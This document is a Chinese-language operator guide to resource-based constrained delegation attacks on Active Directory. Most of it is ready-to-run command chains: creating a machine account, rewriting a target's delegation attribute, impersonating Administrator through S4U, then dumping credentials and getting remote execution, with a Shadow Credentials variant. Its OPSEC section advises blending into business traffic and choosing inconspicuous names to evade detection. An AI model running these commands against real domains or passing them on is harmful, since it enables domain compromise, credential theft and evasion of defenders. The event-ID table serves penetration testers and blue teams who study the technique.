# 基于资源的约束委派 (RBCD) 攻击详解

## RBCD 原理

### 传统约束委派 vs RBCD

传统约束委派 (Constrained Delegation) 由**委派方**的 `msDS-AllowedToDelegateTo` 属性控制，配置需要域管权限 (SeEnableDelegationPrivilege)。

RBCD 由**目标资源**的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性控制，只需要对目标计算机对象有写权限即可配置。这意味着普通域用户在特定 ACL 条件下即可发起攻击。

### 攻击逻辑

```
攻击者对 TargetPC$ 有 GenericWrite 权限
    │
    ├─ 1. 创建/控制一个有 SPN 的账号 (AttackerPC$)
    ├─ 2. 修改 TargetPC$ 的 msDS-AllowedToActOnBehalfOfOtherIdentity
    │     → 允许 AttackerPC$ 代表任意用户委派到 TargetPC$
    ├─ 3. 以 AttackerPC$ 身份执行 S4U2Self + S4U2Proxy
    │     → 获取 Administrator → TargetPC$ 的 ST
    └─ 4. 使用 ST 访问 TargetPC$ (cifs/ldap/http 等)
```

### msDS-AllowedToActOnBehalfOfOtherIdentity

该属性存储一个安全描述符 (Security Descriptor)，格式为二进制 DACL，指定哪些 SID 可以委派到此资源。

---

## 前提条件检查

### 检查 1: 对目标的写权限

需要以下任意权限之一:
- `GenericAll` — 完全控制
- `GenericWrite` — 写入任意属性
- `WriteDacl` — 修改 ACL
- `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`

```powershell
# PowerView — 检查当前用户对目标的权限
Get-DomainObjectAcl -Identity "<TARGET>$" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl|WriteProperty"
} | Select-Object SecurityIdentifier, ActiveDirectoryRights

# 解析 SID 为账号名
Get-DomainObjectAcl -Identity "<TARGET>$" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl"
} | ForEach-Object {
    $sid = $_.SecurityIdentifier
    $name = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount])
    [PSCustomObject]@{Account=$name; Rights=$_.ActiveDirectoryRights}
}
```

```bash
# BloodHound Cypher 查询
MATCH p=(u)-[:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN u.name, c.name
```

### 检查 2: 机器账号配额 (MAQ)

```bash
# crackmapexec 检查 MAQ
crackmapexec ldap <DC_IP> -u <USER> -p <PASSWORD> -M maq
# 输出: MachineAccountQuota: 10

# LDAP 手动查询
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w "<PASSWORD>" \
  -b "DC=domain,DC=local" "(objectClass=domain)" ms-DS-MachineAccountQuota
```

```powershell
# PowerView
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota
```

如果 MAQ = 0，参见下方 "替代方案" 章节。

### 检查 3: 现有 RBCD 配置

```bash
# rbcd.py 查看当前配置
rbcd.py -delegate-to '<TARGET>$' -action read \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

```powershell
# PowerView
Get-DomainComputer <TARGET> -Properties msds-allowedtoactonbehalfofotheridentity

# 解析已配置的 SID
$computer = Get-DomainComputer <TARGET> -Properties msds-allowedtoactonbehalfofotheridentity
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $computer.'msds-allowedtoactonbehalfofotheridentity', 0
$sd.DiscretionaryAcl | ForEach-Object {
    Convert-SidToName $_.SecurityIdentifier
}
```

---

## 完整攻击链

### Step 1: 创建机器账号

```bash
# addcomputer.py — 创建机器账号
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'P@ssw0rd123' \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>

# 验证创建成功
crackmapexec ldap <DC_IP> -u <USER> -p <PASSWORD> \
  --kdcHost <DC_FQDN> -M get-desc-users 2>/dev/null
```

```powershell
# PowerMad
Import-Module PowerMad.ps1
New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force)

# StandIn
StandIn.exe --computer YOURPC --make
```

### Step 2: 配置 RBCD

```bash
# rbcd.py — 配置委派
rbcd.py -delegate-from 'YOURPC$' -delegate-to '<TARGET>$' -action write \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>

# 使用 Hash
rbcd.py -delegate-from 'YOURPC$' -delegate-to '<TARGET>$' -action write \
  -hashes :<NT_HASH> -dc-ip <DC_IP> <DOMAIN>/<USER>

# 验证
rbcd.py -delegate-to '<TARGET>$' -action read \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

```powershell
# PowerView 手动配置
$sid = Get-DomainComputer YOURPC -Properties objectsid | Select-Object -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject <TARGET>$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

### Step 3: S4U 攻击获取票据

```bash
# getST.py — 获取 Administrator 的 ST
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  -dc-ip <DC_IP> <DOMAIN>/'YOURPC$':'P@ssw0rd123'

# 使用票据
export KRB5CCNAME=Administrator.ccache
```

```powershell
# Rubeus — 计算 Hash
Rubeus.exe hash /password:P@ssw0rd123 /user:YOURPC$ /domain:<DOMAIN>

# Rubeus — S4U 攻击
Rubeus.exe s4u /user:YOURPC$ /rc4:<COMPUTED_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
```

### Step 4: 利用票据

```bash
# secretsdump — 导出凭据
secretsdump.py -k -no-pass <TARGET_FQDN>

# psexec — 远程命令执行
psexec.py -k -no-pass <TARGET_FQDN>

# smbclient — 文件操作
smbclient.py -k -no-pass <TARGET_FQDN>

# wmiexec — WMI 执行
wmiexec.py -k -no-pass <TARGET_FQDN>
```

---

## 替代方案: 已有机器账号凭据

如果已通过其他途径获取了域内机器账号的凭据 (NTLM Hash / AES Key)，无需创建新机器账号:

```bash
# 直接使用已控制的机器账号
rbcd.py -delegate-from 'OWNED_PC$' -delegate-to '<TARGET>$' -action write \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>

# S4U 使用已有机器账号的 Hash
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  -hashes :<MACHINE_NT_HASH> -dc-ip <DC_IP> <DOMAIN>/'OWNED_PC$'
```

适用场景:
- MAQ = 0 无法创建新机器账号
- 已通过 secretsdump 获取机器账号 Hash
- 已通过 NTLM relay 获取机器账号凭据

---

## 替代路径: Shadow Credentials

当目标计算机支持 PKINIT 且域内有 ADCS (证书服务) 时，可以通过修改 `msDS-KeyCredentialLink` 属性实现类似效果:

```bash
# pywhisker — 添加 Shadow Credential
pywhisker -d <DOMAIN> -u <USER> -p <PASSWORD> --target '<TARGET>$' \
  --action add --dc-ip <DC_IP>

# 输出包含 pfx 文件路径和密码
# [+] Created PFX: <TARGET>.pfx
# [+] PFX Password: <RANDOM_PASSWORD>

# 使用证书获取 TGT
gettgtpkinit.py -cert-pfx <TARGET>.pfx -pfx-pass <PFX_PASSWORD> \
  <DOMAIN>/'<TARGET>$' <TARGET>.ccache

# 获取 NT Hash (U2U)
getnthash.py -key <AS-REP_KEY> <DOMAIN>/'<TARGET>$'

# 然后可配置 RBCD 或直接使用 Hash
```

Shadow Credentials 优势:
- 不需要创建机器账号
- 不需要 MAQ > 0
- 操作更隐蔽 (不产生 4741 事件)

Shadow Credentials 前提:
- 域内有至少一个 Enterprise CA
- DC 支持 PKINIT (Windows Server 2016+)
- 对目标有 `GenericWrite` / `GenericAll` 权限

---

## 清理命令

**必须在攻击完成后执行清理，还原所有修改:**

### 清除 RBCD 配置

```bash
# rbcd.py — 清除 (flush) RBCD 属性
rbcd.py -delegate-to '<TARGET>$' -action flush \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>

# 验证已清除
rbcd.py -delegate-to '<TARGET>$' -action read \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
# 输出应为空或无委派配置
```

```powershell
# PowerView — 清除属性
Get-DomainComputer -Identity <TARGET> | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

# 验证
Get-DomainComputer <TARGET> -Properties msds-allowedtoactonbehalfofotheridentity
# 应返回空
```

### 删除创建的机器账号

```bash
# addcomputer.py — 删除机器账号
addcomputer.py -computer-name 'YOURPC$' -delete \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

```powershell
# PowerView
Remove-DomainObject -Identity 'YOURPC$'
```

### 清除 Shadow Credentials (如使用)

```bash
# pywhisker — 列出并删除
pywhisker -d <DOMAIN> -u <USER> -p <PASSWORD> --target '<TARGET>$' \
  --action list --dc-ip <DC_IP>

pywhisker -d <DOMAIN> -u <USER> -p <PASSWORD> --target '<TARGET>$' \
  --action remove --device-id <DEVICE_ID> --dc-ip <DC_IP>
```

### 清理本地文件

```bash
# 删除票据缓存
rm -f *.ccache *.kirbi *.pfx

# 取消环境变量
unset KRB5CCNAME
```

---

## OPSEC 注意事项

### 攻击行为产生的日志

| 操作 | Event ID | 说明 |
|------|----------|------|
| 创建机器账号 | 4741 | "A computer account was created" |
| 修改 RBCD 属性 | 5136 | 目录服务属性变更 |
| S4U2Self | 4769 | 票据请求包含 S4U 标志 |
| S4U2Proxy | 4769 | Transited Services 字段非空 |
| 使用票据访问 | 4624 (Type 3) | 网络登录 |
| 删除机器账号 | 4743 | "A computer account was deleted" |

### 降低检测风险

1. **机器账号命名**: 使用符合域内命名规范的名称，避免 `YOURPC` `FAKE01` 等明显异常名
2. **操作时间**: 在业务高峰期操作，混入正常流量
3. **及时清理**: 攻击完成后立即清除 RBCD 配置和机器账号
4. **避免 DCSync**: 如果只需要特定机器权限，不必升级到域控
5. **使用已有账号**: 优先使用已控制的机器账号而非创建新账号，减少 4741 事件

### 常见检测规则

蓝队通常监控:
- `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性变更 (Event ID 5136)
- 短时间内创建机器账号后立即出现 S4U 请求
- 新创建的机器账号发起 S4U2Self/S4U2Proxy
- 非预期来源的 Administrator 网络登录

### 特殊注意

- RBCD 配置立即生效，无需等待 AD 复制
- 被模拟的用户不能在 Protected Users 组中
- 被模拟的用户不能标记 "Account is sensitive and cannot be delegated"
- 默认 MAQ = 10，每个用户最多创建 10 个机器账号
- 机器账号密码可自定义，默认长度 120 字符随机
- 清理时要同时删除机器账号和 RBCD 配置，遗漏任何一个都会留下痕迹
